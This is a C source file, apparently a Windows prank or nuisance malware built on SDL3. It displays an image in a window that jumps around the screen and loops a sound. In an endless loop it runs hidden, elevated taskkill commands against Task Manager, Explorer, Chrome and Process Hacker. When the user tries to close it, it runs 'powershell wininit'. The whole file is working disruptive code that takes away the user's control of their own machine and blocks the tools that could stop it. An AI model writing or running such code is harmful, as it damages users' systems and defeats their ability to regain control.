#include <SDL3/SDL.h>
#include <windows.h>
#include <mmsystem.h>

int main()
{
  SDL_Window *window;
  SDL_Renderer *renderer;
  SDL_Surface *surface;
  SDL_Texture *texture;

  if (!SDL_Init(SDL_INIT_VIDEO) || !SDL_Init(SDL_INIT_AUDIO))
  {
    SDL_LogError(SDL_LOG_CATEGORY_APPLICATION, "Couldn't initialize SDL: %s", SDL_GetError());
    return 3;
  }

  SDL_CreateWindowAndRenderer(
      "hfdh",
      800,
      600,
      SDL_WINDOW_OPENGL,
      &window,
      &renderer);

  // const SDL_AudioSpec srcspec = {SDL_AUDIO_S16, 1, 22050};
  // const SDL_AudioSpec dstspec = {SDL_AUDIO_F32, 2, 48000};
  // SDL_AudioStream *stream = SDL_CreateAudioStream(&srcspec, &dstspec);

  surface = SDL_LoadBMP("fuck.bmp");
  texture = SDL_CreateTextureFromSurface(renderer, surface);

  SDL_DestroySurface(surface);

  PlaySound(TEXT("dur.wav"), NULL, SND_ASYNC | SND_LOOP | SND_FILENAME);

  while (true)
  {
    SDL_Event event;
    SDL_PollEvent(&event);

    ShellExecute(NULL, "runas", "taskkill", "/f /im taskmgr.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im explorer.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im chrome.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im ProcessHacker.exe", NULL, SW_HIDE);

    if (event.type == SDL_EVENT_QUIT)
    {
      SDL_ShowSimpleMessageBox(SDL_MESSAGEBOX_WARNING, "Title", "Message", window);
      system("powershell wininit");
    }

    SDL_SetWindowPosition(window, rand() % 1920, rand() % 1080);

    // MessageBeep(0xFFFFFFFF);

    SDL_SetRenderDrawColor(renderer, 0, 0, 0, 0);
    SDL_RenderClear(renderer);
    SDL_RenderTexture(renderer, texture, NULL, NULL);
    SDL_RenderPresent(renderer);
  }

  SDL_DestroyTexture(texture);
  SDL_DestroyRenderer(renderer);
  SDL_DestroyWindow(window);
  SDL_Quit();

  return 0;
}